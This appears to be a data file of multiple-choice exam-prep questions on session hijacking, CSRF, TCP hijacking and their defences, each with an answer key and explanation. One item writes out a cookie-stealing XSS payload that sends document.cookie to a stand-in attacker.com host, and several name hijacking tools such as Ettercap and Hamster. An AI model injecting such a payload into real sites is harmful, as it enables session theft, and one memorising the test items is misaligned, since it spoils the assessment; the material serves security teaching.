What is session hijacking?|Hijacking physical cables|Taking over an established session between a client and server by stealing or predicting session tokens|Blocking sessions|Creating new sessions|1|Session hijacking involves taking over an active session between a client and server by stealing, predicting, or intercepting session identifiers (tokens, cookies, IDs), allowing the attacker to impersonate the legitimate user without authentication.|Session Hijacking|Fundamentals
What is a session token?|A physical token device|A unique identifier used to maintain state between client and server across multiple requests|A password|An encryption key|1|A session token (or session ID) is a unique identifier assigned to a user after authentication, stored in cookies or URLs. It maintains session state across stateless HTTP requests, allowing the server to recognize returning users.|Session Hijacking|Fundamentals
Where are session tokens commonly stored?|In RAM only|In cookies, URL parameters, or hidden form fields|On the server only|In the BIOS|1|Session tokens are commonly stored in HTTP cookies (most secure), URL parameters (visible and insecure), or hidden form fields. Cookies can be marked HttpOnly and Secure for additional protection against theft.|Session Hijacking|Fundamentals
What is session sidejacking?|Hijacking side channels|Stealing session cookies from unencrypted wireless traffic|Physical hijacking|DNS hijacking|1|Session sidejacking (also called cookie hijacking) involves sniffing unencrypted network traffic to capture session cookies, particularly on open wireless networks. The attacker can then use the stolen cookie to impersonate the victim.|Session Hijacking|Techniques
What tool was famously used for session sidejacking on wireless networks?|Wireshark|Firesheep|Nmap|Metasploit|1|Firesheep was a Firefox extension that automated session sidejacking on wireless networks, capturing cookies from unencrypted HTTP traffic and allowing one-click account hijacking. It demonstrated the risks of unsecured wireless and HTTP usage.|Session Hijacking|Tools
What tools are mentioned in the CEH curriculum for session hijacking?|Nmap and Nessus|Ferret and Hamster|John the Ripper and Hashcat|Burp Suite and ZAP|1|Ferret captures session cookies and authentication data into a text file, while Hamster acts as a proxy to replay captured sessions. The attacker simply clicks through captured sessions until one works.|Session Hijacking|Tools
What is session fixation?|Fixing broken sessions|Attacker sets a known session ID and tricks the victim into authenticating with it|Securing sessions|Encrypting sessions|1|In session fixation, the attacker obtains a valid session ID from the target site, sends it to the victim (via email link), and waits for the victim to authenticate. The attacker can then use the pre-set session ID to access the victim's account.|Session Hijacking|Techniques
How does session fixation differ from session hijacking?|They're identical|Fixation sets the session ID before victim authenticates; hijacking steals an existing authenticated session|Fixation is faster|Fixation uses encryption|1|Session fixation involves setting the session ID before the victim authenticates (attacker controls the ID from the start). Session hijacking steals or predicts an already-established authenticated session ID.|Session Hijacking|Techniques
What is the primary defense against session fixation?|Using longer passwords|Regenerating session IDs after successful authentication|Disabling cookies|Using HTTP only|1|The key defense against session fixation is regenerating the session ID after successful authentication. This invalidates any pre-set session IDs the attacker may have provided to the victim.|Session Hijacking|Mitigation
What does the HttpOnly flag on cookies prevent?|All HTTP access|JavaScript from accessing the cookie, mitigating XSS-based session theft|Cookie storage|Cookie transmission|1|The HttpOnly flag prevents client-side JavaScript from accessing cookies, protecting against XSS attacks that attempt to steal session cookies via document.cookie. The cookie is only sent in HTTP requests.|Session Hijacking|Mitigation
What does the Secure flag on cookies do?|Encrypts cookies|Ensures cookies are only transmitted over HTTPS connections|Deletes cookies|Validates cookies|1|The Secure flag ensures cookies are only transmitted over encrypted HTTPS connections, preventing session cookie theft via network sniffing on unencrypted HTTP traffic.|Session Hijacking|Mitigation
What is Cross-Site Request Forgery (CSRF)?|XSS variant|Forcing authenticated users to execute unwanted actions by exploiting their existing session|SQL injection|Buffer overflow|1|CSRF tricks authenticated users into submitting malicious requests that inherit their identity and privileges. Since browsers automatically include cookies with requests, the server can't distinguish legitimate requests from forged ones.|Session Hijacking|CSRF
How does CSRF exploit user sessions?|By stealing passwords|By leveraging the user's existing authentication to perform unauthorized actions|By cracking encryption|By DDoS|1|CSRF exploits the fact that browsers automatically include authentication cookies with every request to a domain. Attackers craft malicious requests that execute with the victim's privileges when the victim is authenticated.|Session Hijacking|CSRF
What is a common CSRF attack vector?|Direct server attack|Malicious links or forms on attacker-controlled sites that submit requests to target sites where victim is authenticated|Brute force|Port scanning|1|CSRF attacks commonly use malicious links, hidden forms, or images on attacker-controlled sites that make requests to target sites (banks, social media) where the victim has an active authenticated session.|Session Hijacking|CSRF
What is the primary defense against CSRF?|Longer session timeouts|Anti-CSRF tokens: unpredictable random values required with each state-changing request|Disabling cookies|Using HTTP|1|Anti-CSRF tokens (also called challenge tokens or synchronizer tokens) are random, unpredictable values included in forms and validated server-side. Since attackers can't predict these tokens, they can't craft valid CSRF requests.|Session Hijacking|Mitigation
What HTTP method is most susceptible to CSRF?|GET|POST and state-changing operations|HEAD|OPTIONS|1|While GET requests can be exploited, POST requests and state-changing operations (money transfers, password changes, account modifications) are the primary CSRF targets because they perform actions rather than just retrieving data.|Session Hijacking|CSRF
What is session prediction?|Guessing passwords|Analyzing session ID generation patterns to predict valid session IDs|Forecasting traffic|Predicting attacks|1|Session prediction involves analyzing how session IDs are generated to identify patterns or weaknesses. If IDs are sequential, time-based, or use weak randomness, attackers can predict valid session IDs without sniffing.|Session Hijacking|Techniques
What makes a session ID vulnerable to prediction?|Length|Weak randomness, sequential generation, or timestamp-based patterns|Encryption|Cookie storage|1|Session IDs are vulnerable to prediction if they use sequential numbers, timestamps, weak random number generators, or have insufficient entropy. Strong session IDs must be cryptographically random and unpredictable.|Session Hijacking|Vulnerabilities
What is TCP session hijacking?|Hijacking UDP|Injecting packets into an established TCP connection by predicting sequence numbers|HTTP hijacking|DNS hijacking|1|TCP session hijacking involves injecting malicious packets into an established TCP connection by predicting sequence numbers. The attacker desynchronizes the legitimate client and takes over the connection to the server.|Session Hijacking|Network Layer
What role do TCP sequence numbers play in session hijacking?|No role|Attackers must predict correct sequence numbers to inject packets that the server will accept|Encryption|Authentication|1|TCP sequence numbers track data order. To hijack a TCP session, attackers must predict the next expected sequence number so their injected packets are accepted by the server while the legitimate client's packets are rejected.|Session Hijacking|Network Layer
What is desynchronization in TCP hijacking?|Network failure|Sending packets to disrupt the client-server synchronization, causing the client to lose connection while attacker maintains it|Encryption loss|Time sync issues|1|Desynchronization involves sending packets that cause the legitimate client and server to lose TCP synchronization (mismatched sequence/acknowledgment numbers), effectively disconnecting the client while the attacker maintains the hijacked connection.|Session Hijacking|Network Layer
What tool can be used for TCP/IP hijacking?|Wireshark only|Hunt, Ettercap, or custom packet injection tools|Nmap|Nessus|1|Tools like Hunt and Ettercap can perform TCP/IP hijacking by sniffing connections, predicting sequence numbers, and injecting packets. These tools automate the complex process of maintaining TCP synchronization.|Session Hijacking|Tools
What is blind hijacking?|Hijacking without seeing|Injecting commands into a TCP session without seeing responses, relying on predictable behavior|Random hijacking|Encrypted hijacking|1|Blind hijacking occurs when the attacker can inject commands into a session but cannot see the server's responses (due to network positioning). The attacker must predict outcomes and send commands that will execute regardless of current state.|Session Hijacking|Network Layer
What is session sniffing?|Encrypting sessions|Capturing network traffic to steal unencrypted session tokens from packets|Blocking sessions|Compressing sessions|1|Session sniffing involves using packet capture tools (Wireshark, tcpdump) to intercept network traffic and extract session tokens, cookies, or credentials transmitted in clear text over unencrypted connections (HTTP, Telnet, FTP).|Session Hijacking|Techniques
Why is HTTPS critical for preventing session hijacking?|Faster performance|Encrypts all traffic including session cookies, preventing sniffing and sidejacking|Smaller packets|Better caching|1|HTTPS encrypts all traffic between client and server, including session cookies and authentication data. This prevents attackers from sniffing network traffic to steal session tokens, making sidejacking and session sniffing ineffective.|Session Hijacking|Mitigation
What is man-in-the-middle (MITM) session hijacking?|Middle server attacks|Intercepting and relaying communication between client and server while stealing or manipulating session data|Load balancing|Proxy caching|1|MITM session hijacking involves positioning between client and server to intercept, relay, and potentially modify all traffic. The attacker can steal session tokens, inject commands, or manipulate data while both parties believe they're communicating directly.|Session Hijacking|Techniques
What technique does Ettercap use to enable MITM attacks?|Port scanning|ARP spoofing to redirect traffic through the attacker's machine|Brute force|SQL injection|1|Ettercap uses ARP spoofing to poison the ARP cache of target systems, making them send traffic to the attacker's MAC address. This positions the attacker as a man-in-the-middle, enabling session hijacking and traffic manipulation.|Session Hijacking|Tools
What is session donation?|Giving away sessions|Attacker creates a session on their machine and tricks victim into using it|Sharing accounts|Load balancing|1|Session donation involves the attacker creating and authenticating a session on their machine, then tricking the victim into using that session. The attacker maintains access to the donated session's privileges.|Session Hijacking|Techniques
What is cross-site scripting (XSS) role in session hijacking?|No role|XSS can steal session cookies by executing malicious JavaScript that sends document.cookie to attacker|XSS prevents hijacking|XSS encrypts sessions|1|XSS vulnerabilities allow attackers to inject JavaScript that accesses document.cookie and sends session tokens to attacker-controlled servers. This is why the HttpOnly flag is critical—it prevents JavaScript cookie access.|Session Hijacking|XSS Integration
What JavaScript code is commonly used in XSS to steal cookies?|alert('XSS')|document.location='http://attacker.com/steal.php?cookie='+document.cookie|console.log()|window.close()|1|The classic cookie-stealing XSS payload redirects the browser to an attacker's server with the cookie as a URL parameter: document.location='http://attacker.com/?c='+document.cookie. The HttpOnly flag prevents this.|Session Hijacking|XSS Integration
What is session timeout used for?|Limiting bandwidth|Automatically invalidating sessions after period of inactivity to reduce hijacking window|Improving performance|Load balancing|1|Session timeouts automatically invalidate sessions after a defined period of inactivity (e.g., 15-30 minutes). This limits the window of opportunity for attackers to exploit stolen or hijacked sessions.|Session Hijacking|Mitigation
What is an appropriate session timeout duration for banking applications?|24 hours|Short timeouts (5-15 minutes) due to high security requirements|1 week|No timeout|1|Banking and financial applications require short session timeouts (5-15 minutes of inactivity) due to high security requirements, balancing user convenience with risk mitigation for hijacked sessions.|Session Hijacking|Mitigation
What is session binding or binding session to IP address?|Network routing|Associating session with specific client attributes (IP, user agent) to detect hijacking attempts|Load balancing|Encryption|1|Session binding ties sessions to specific client attributes like IP address or User-Agent header. If these change mid-session, it may indicate hijacking. However, this can cause false positives with legitimate users behind NAT or mobile networks.|Session Hijacking|Mitigation
Why can IP-based session binding cause problems?|It's too secure|Users behind NAT or mobile networks may have changing IP addresses, causing false positives|It's too slow|It uses too much memory|1|IP-based session binding can break legitimate sessions for users behind NAT (multiple users share one IP), mobile networks (IP changes when switching towers), or load-balanced proxies (requests come from different IPs).|Session Hijacking|Mitigation
What is session replay attack?|Rewinding sessions|Capturing and retransmitting valid session data to gain unauthorized access|Playing videos|Audio playback|1|Session replay attacks involve capturing complete authentication sequences or session data and retransmitting them to gain unauthorized access. This is why using timestamps, nonces, or one-time tokens in authentication is important.|Session Hijacking|Techniques
What are nonces used for in preventing session attacks?|Encryption|Number used once: random values that prevent replay attacks by ensuring each request is unique|Compression|Routing|1|A nonce (number used once) is a random value included in each request/response that prevents replay attacks. Since each transaction requires a new nonce, captured session data cannot be replayed successfully.|Session Hijacking|Mitigation
What is the SameSite cookie attribute?|Cookie size|Restricts cookie transmission to same-site requests, mitigating CSRF attacks|Cookie encryption|Cookie compression|1|The SameSite attribute (Strict, Lax, or None) controls when cookies are sent with cross-site requests. SameSite=Strict prevents cookies from being sent in any cross-site context, effectively mitigating CSRF attacks.|Session Hijacking|Mitigation
What does SameSite=Strict do?|Enables all cookies|Prevents cookies from being sent with any cross-site requests|Encrypts cookies|Compresses cookies|1|SameSite=Strict prevents the browser from sending cookies with any cross-site requests, even when clicking links. This provides strong CSRF protection but may break legitimate cross-site functionality.|Session Hijacking|Mitigation
What does SameSite=Lax allow?|All cookies|Cookies with cross-site top-level navigation (clicking links) but not subresources (images, AJAX)|No cookies|Random cookies|1|SameSite=Lax allows cookies to be sent when users click links to navigate to the site (top-level GET requests) but not with embedded resources or AJAX requests, balancing security and usability.|Session Hijacking|Mitigation
What is token-based authentication's advantage over session cookies?|Faster|Stateless tokens (like JWT) can be validated without server-side session storage, reducing hijacking impact|Smaller|Prettier|1|Token-based authentication (JWT, OAuth tokens) is stateless and self-contained, requiring no server-side session storage. Tokens can include expiration, making them automatically invalid after a time period even if stolen.|Session Hijacking|Modern Defenses
What is JWT (JSON Web Token)?|Java Web Tool|Self-contained authentication token encoded in JSON, signed to prevent tampering|JavaScript Testing|JSON Web Template|1|JWT is a stateless authentication mechanism where claims (user info, permissions, expiration) are encoded in JSON, signed (and optionally encrypted), and sent with each request. Servers validate the signature without storing session state.|Session Hijacking|Modern Defenses
What risk does JWT present if stolen?|No risk|If not encrypted and stolen, attacker has access until expiration (implement short expiration and refresh tokens)|Immediate expiration|Automatic revocation|1|JWTs are bearer tokens—anyone with a valid JWT can use it. If stolen, attackers have access until expiration. Best practices include short expiration times (5-15 minutes), refresh tokens, and storing JWTs securely (not in localStorage).|Session Hijacking|Modern Defenses
What is OAuth 2.0's role in session security?|Encryption protocol|Delegated authorization framework that issues limited-scope access tokens instead of sharing passwords|Password manager|VPN protocol|1|OAuth 2.0 enables delegated authorization where users grant limited permissions to applications without sharing passwords. Applications receive short-lived access tokens with specific scopes, reducing the impact of token compromise.|Session Hijacking|Modern Defenses
What is refresh token rotation?|Rotating encryption|Issuing new refresh tokens with each use and invalidating old ones to prevent replay|Key rotation|Password rotation|1|Refresh token rotation issues a new refresh token each time one is used to obtain a new access token, invalidating the old refresh token. This detects and prevents stolen refresh token reuse.|Session Hijacking|Modern Defenses
What is Content Security Policy (CSP) role in session security?|Server hardening|HTTP header that restricts resource loading, mitigating XSS attacks that could steal session cookies|Encryption protocol|Authentication method|1|CSP is an HTTP header that defines allowed sources for scripts, styles, and other resources. By restricting inline scripts and untrusted sources, CSP mitigates XSS attacks that could inject cookie-stealing JavaScript.|Session Hijacking|Mitigation
What is the double-submit cookie pattern for CSRF protection?|Two cookies|Sending CSRF token both as cookie and request parameter; server validates they match|Duplicate cookies|Encrypted cookies|1|The double-submit cookie pattern sends the CSRF token both as a cookie and in a request parameter (header or form field). Since attackers can't read cookies due to same-origin policy, they can't include matching values in forged requests.|Session Hijacking|CSRF Mitigation
How does the referer header help detect CSRF?|It doesn't|Validating the referer header ensures requests originate from same domain, though it can be spoofed or blocked|It encrypts requests|It authenticates users|1|Checking the Referer (or Origin) header ensures requests originate from the same domain. However, some users/proxies block referer headers for privacy, and sophisticated attacks may manipulate them.|Session Hijacking|CSRF Mitigation
What is session puzzling or session variable overloading?|Confusing users|Exploiting applications that reuse session variables for different purposes in different contexts|Encrypting sessions|Password guessing|1|Session puzzling exploits applications that reuse the same session variable names for different purposes. Attackers manipulate variables in one context that are then trusted in another context, leading to privilege escalation or authentication bypass.|Session Hijacking|Advanced Attacks
What tool can capture SSL/TLS sessions by acting as a proxy?|Nmap|sslsniff or Ettercap with SSL proxy mode|Hashcat|Aircrack-ng|1|sslsniff dynamically generates certificates for SSL/TLS MITM attacks, while Ettercap can act as an SSL proxy to intercept encrypted sessions. Both require the victim to accept invalid certificate warnings.|Session Hijacking|Tools
What is the most effective overall defense against session hijacking?|Longer passwords|Implement HTTPS everywhere with HSTS, use HttpOnly and Secure flags, implement CSRF tokens, and enforce short session timeouts|Disable cookies entirely|Use only GET requests|1|Defense-in-depth approach: HTTPS with HSTS (forces encrypted connections), HttpOnly/Secure cookie flags (prevents XSS theft and unencrypted transmission), CSRF tokens (prevents cross-site attacks), short timeouts (limits exposure window), and session regeneration after authentication (prevents fixation).|Session Hijacking|Mitigation
